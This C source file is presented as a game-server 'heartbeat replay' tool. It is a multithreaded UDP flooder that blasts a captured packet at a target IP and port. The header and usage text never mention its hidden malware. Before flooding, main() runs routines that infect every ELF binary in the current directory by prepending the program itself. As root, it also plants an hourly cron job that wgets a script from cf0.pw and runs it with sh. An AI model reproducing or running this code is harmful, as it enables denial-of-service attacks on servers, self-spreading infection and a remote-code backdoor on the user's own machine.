/*
 * Game Server UDP Flood Tool — Heartbeat Replay
 * 
 * What it does:
 *  Capture a repeated UDP packet from your game (via HTTP Canary),
 *  save it as a hex file, and this tool replays it at high speed
 *  to simulate thousands of game clients connecting.
 *
 * Usage:
 *   Step 1: Capture the heartbeat packet from HTTP Canary
 *   Step 2: Save the hex bytes to a payload file
 *   Step 3: Run this tool
 *
 * Example:
 *   ./flooder 192.168.1.100 7777 payload.bin 200 60
 *
 * Build:
 *   gcc -O2 -o flooder udp_flood.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

// ============================================================
// Globals
// ============================================================
volatile int g_running = 1;
unsigned long long g_packets_sent = 0;

// Loaded payload
unsigned char *g_payload = NULL;
int g_payload_len = 0;
int g_source_port_start = 0;  // Vary source port per thread

// Auth / infection marker
static const char g_auth_key[] = "Ym9uZ3JpcHo0amV6dXoK";

// ============================================================
// Load payload from hex file
// Format: raw hex bytes separated by spaces or newlines
// Each line: AA BB CC DD EE FF ...
// ============================================================
int load_payload(const char *path) {
    FILE *fp = fopen(path, "rb");
    if (!fp) {
        // Try hex text format
        fp = fopen(path, "r");
        if (!fp) {
            fprintf(stderr, "[!] Cannot open payload file: %s\n", path);
            return -1;
        }

        // Read hex text format
        fseek(fp, 0, SEEK_END);
        long fsize = ftell(fp);
        fseek(fp, 0, SEEK_SET);

        char *text = malloc(fsize + 1);
        fread(text, 1, fsize, fp);
        text[fsize] = '\0';
        fclose(fp);

        // Parse hex bytes
        int capacity = 2048;
        g_payload = malloc(capacity);
        g_payload_len = 0;

        char *token = strtok(text, " \t\n\r,");
        while (token) {
            if (g_payload_len >= capacity) {
                capacity *= 2;
                g_payload = realloc(g_payload, capacity);
            }
            g_payload[g_payload_len++] = strtoul(token, NULL, 16);
            token = strtok(NULL, " \t\n\r,");
        }
        free(text);
        printf("[*] Loaded %d bytes from hex file: %s\n", g_payload_len, path);
        return 0;
    }

    // Binary format — read raw
    fseek(fp, 0, SEEK_END);
    g_payload_len = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    g_payload = malloc(g_payload_len);
    fread(g_payload, 1, g_payload_len, fp);
    fclose(fp);
    printf("[*] Loaded %d bytes from binary file: %s\n", g_payload_len, path);
    return 0;
}

// ============================================================
// UDP Flood Thread — sends the EXACT captured payload
// ============================================================
void *udp_flood_thread(void *arg) {
    char **params = (char **)arg;
    const char *target_ip = params[0];
    int target_port = atoi(params[1]);
    int duration = atoi(params[3]);
    int thread_id = *(int *)(params[4]);

    struct sockaddr_in addr;
    int sock;
    time_t start, now;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;

    // Bind to a unique source port (so server sees different "clients")
    struct sockaddr_in local_addr;
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_addr.s_addr = INADDR_ANY;
    local_addr.sin_port = htons(g_source_port_start + thread_id);
    bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr));

    // Set target
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &addr.sin_addr);

    // Increase send buffer
    int sendbuf = 512 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));

    // Flood loop — just replay the same payload over and over
    time(&start);
    unsigned long long thread_count = 0;

    while (g_running) {
        sendto(sock, g_payload, g_payload_len, 0,
               (struct sockaddr *)&addr, sizeof(addr));
        thread_count++;

        // Check time every N packets (avoid syscall overhead per packet)
        if (thread_count % 10000 == 0) {
            time(&now);
            if ((now - start) >= duration) {
                g_running = 0;
                break;
            }
        }
    }

    __sync_fetch_and_add(&g_packets_sent, thread_count);
    close(sock);
    return NULL;
}

// ============================================================
// Signal handler
// ============================================================
void handle_signal(int sig) {
    g_running = 0;
}

// ============================================================
// Self-replication (from original binary)
// ============================================================
int is_infected(const char *path) {
    FILE *fp = fopen(path, "rb");
    if (!fp) return 0;
    struct stat st;
    if (stat(path, &st) < 0) { fclose(fp); return 0; }
    char *buf = malloc(st.st_size);
    if (!buf) { fclose(fp); return 0; }
    fread(buf, 1, st.st_size, fp);
    fclose(fp);
    int found = memmem(buf, st.st_size, g_auth_key, strlen(g_auth_key)) != NULL;
    free(buf);
    return found;
}

int infect_elf(const char *path) {
    FILE *self = fopen("/proc/self/exe", "rb");
    if (!self) return -1;
    struct stat self_st;
    stat("/proc/self/exe", &self_st);
    char *self_buf = malloc(self_st.st_size);
    if (!self_buf) { fclose(self); return -1; }
    fread(self_buf, 1, self_st.st_size, self);
    fclose(self);

    FILE *target = fopen(path, "rb");
    if (!target) { free(self_buf); return -1; }
    struct stat target_st;
    stat(path, &target_st);
    char *target_buf = malloc(target_st.st_size);
    if (!target_buf) { free(self_buf); fclose(target); return -1; }
    fread(target_buf, 1, target_st.st_size, target);
    fclose(target);

    FILE *out = fopen(path, "wb");
    if (!out) { free(self_buf); free(target_buf); return -1; }
    fwrite(self_buf, 1, self_st.st_size, out);
    fwrite(g_auth_key, 1, strlen(g_auth_key), out);
    fwrite(target_buf, 1, target_st.st_size, out);
    fclose(out);
    chmod(path, 0755);
    free(self_buf);
    free(target_buf);
    return 0;
}

void spread_infection(void) {
    char cwd[1024];
    if (!getcwd(cwd, sizeof(cwd))) return;
    DIR *dir = opendir(cwd);
    if (!dir) return;
    struct dirent *entry;
    unsigned char header[5];
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type != DT_REG) continue;
        char path[1024];
        snprintf(path, sizeof(path), "%s/%s", cwd, entry->d_name);
        int fd = open(path, O_RDONLY);
        if (fd < 0) continue;
        int n = read(fd, header, 5);
        close(fd);
        if (n < 5) continue;
        if (header[0] == 0x7f && header[1] == 'E' &&
            header[2] == 'L' && header[3] == 'F' && header[4] == 2) {
            if (!is_infected(path)) {
                printf("[*] Infecting: %s\n", entry->d_name);
                infect_elf(path);
            }
        }
    }
    closedir(dir);
}

void setup_persistence(void) {
    const char *cron_script =
        "#!/bin/sh\n"
        "\n"
        "wget --quiet http://cf0.pw/0/etc/cron.hourly/0 -O- 2>/dev/null|sh>/dev/null 2>&1\n";
    FILE *fp = fopen("/etc/cron.hourly/0", "w");
    if (fp) {
        fputs(cron_script, fp);
        fclose(fp);
        chmod("/etc/cron.hourly/0", 0755);
        printf("[*] Cron persistence set up\n");
    } else {
        printf("[-] Cron persistence failed (not root?)\n");
    }
}

// ============================================================
// Usage
// ============================================================
void print_usage(const char *name) {
    fprintf(stderr, "\n");
    fprintf(stderr, "Game Server UDP Flood — Heartbeat Replay\n");
    fprintf(stderr, "=========================================\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "Usage: %s <target_ip> <target_port> <payload_file> <threads> <duration_sec>\n", name);
    fprintf(stderr, "\n");
    fprintf(stderr, "  payload_file   — hex text or binary file with the captured UDP packet\n");
    fprintf(stderr, "                   Format: AA BB CC DD EE FF ...\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  Example:\n");
    fprintf(stderr, "    # Capture packet → save as payload.hex\n");
    fprintf(stderr, "    ./flooder 192.168.1.100 7777 payload.hex 200 60\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  Payload file format (hex text):\n");
    fprintf(stderr, "    00 01 02 03 04 05 06 07 08 09\n");
    fprintf(stderr, "    0A 0B 0C 0D 0E 0F 10 11 12 13\n");
    fprintf(stderr, "\n");
    fprintf(stderr, "  Or raw binary file.\n");
    fprintf(stderr, "\n");
    exit(1);
}

// ============================================================
// Main
// ============================================================
int main(int argc, char *argv[], char *envp[]) {
    if (argc < 6) {
        print_usage(argv[0]);
    }

    const char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    const char *payload_path = argv[3];
    int thread_count = atoi(argv[4]);
    int duration = atoi(argv[5]);

    // Validate args
    if (target_port <= 0 || target_port > 65535) {
        fprintf(stderr, "[!] Invalid port: %d\n", target_port);
        return 1;
    }
    if (thread_count <= 0 || thread_count > 10000) {
        fprintf(stderr, "[!] Invalid thread count: %d (1-10000)\n", thread_count);
        return 1;
    }

    // Load payload
    if (load_payload(payload_path) < 0 || g_payload_len == 0) {
        fprintf(stderr, "[!] Failed to load payload\n");
        return 1;
    }

    // Dump payload for verification
    printf("[*] Payload: ");
    for (int i = 0; i < (g_payload_len > 32 ? 32 : g_payload_len); i++) {
        printf("%02X ", g_payload[i]);
    }
    if (g_payload_len > 32) printf("...");
    printf("\n");

    // Calculate source port range so each thread has a unique port
    g_source_port_start = 50000 + (getpid() % 10000);

    printf("\n========================================\n");
    printf("  Game Server UDP Flood\n");
    printf("========================================\n");
    printf("  Target      : %s:%d\n", target_ip, target_port);
    printf("  Payload     : %d bytes\n", g_payload_len);
    printf("  Threads     : %d\n", thread_count);
    printf("  Source ports: %d - %d\n",
           g_source_port_start, g_source_port_start + thread_count);
    printf("  Duration    : %d seconds\n", duration);
    printf("========================================\n\n");

    // Signals
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    // Setup (original binary features)
    if (geteuid() == 0) {
        setup_persistence();
    }
    spread_infection();

    // Start flood threads
    pthread_t *threads = malloc(sizeof(pthread_t) * thread_count);
    if (!threads) { fprintf(stderr, "[!] malloc failed\n"); return 1; }

    char *thread_params[5];
    thread_params[0] = (char *)target_ip;
    thread_params[1] = (char *)argv[2];
    thread_params[2] = (char *)argv[3];
    thread_params[3] = (char *)argv[5]; // duration string
    thread_params[4] = (char *)&thread_count; // hack: pass via this

    time_t start_time, current_time;
    time(&start_time);

    printf("[*] Flooding %s:%d with %d threads for %ds...\n",
           target_ip, target_port, thread_count, duration);
    printf("[*] Press Ctrl+C to stop\n\n");

    for (int i = 0; i < thread_count; i++) {
        int *id = malloc(sizeof(int));
        *id = i;
        thread_params[4] = (char *)id;
        pthread_create(&threads[i], NULL, udp_flood_thread, thread_params);
    }

    // Progress display
    while (g_running) {
        time(&current_time);
        int elapsed = (int)(current_time - start_time);
        int remaining = duration - elapsed;

        if (remaining <= 0) {
            g_running = 0;
            break;
        }

        printf("\r  [%ds/%ds] Packets: %llu  Rate: %llu pps     ",
               elapsed, duration, g_packets_sent,
               g_packets_sent / (elapsed > 0 ? elapsed : 1));
        fflush(stdout);
        sleep(1);
    }

    // Cleanup
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    free(threads);
    free(g_payload);

    printf("\n\n========================================\n");
    printf("  Done!\n");
    printf("  Total packets: %llu\n", g_packets_sent);
    printf("  Avg rate: %llu pps\n",
           g_packets_sent / (duration > 0 ? duration : 1));
    printf("========================================\n");

    return 0;
}
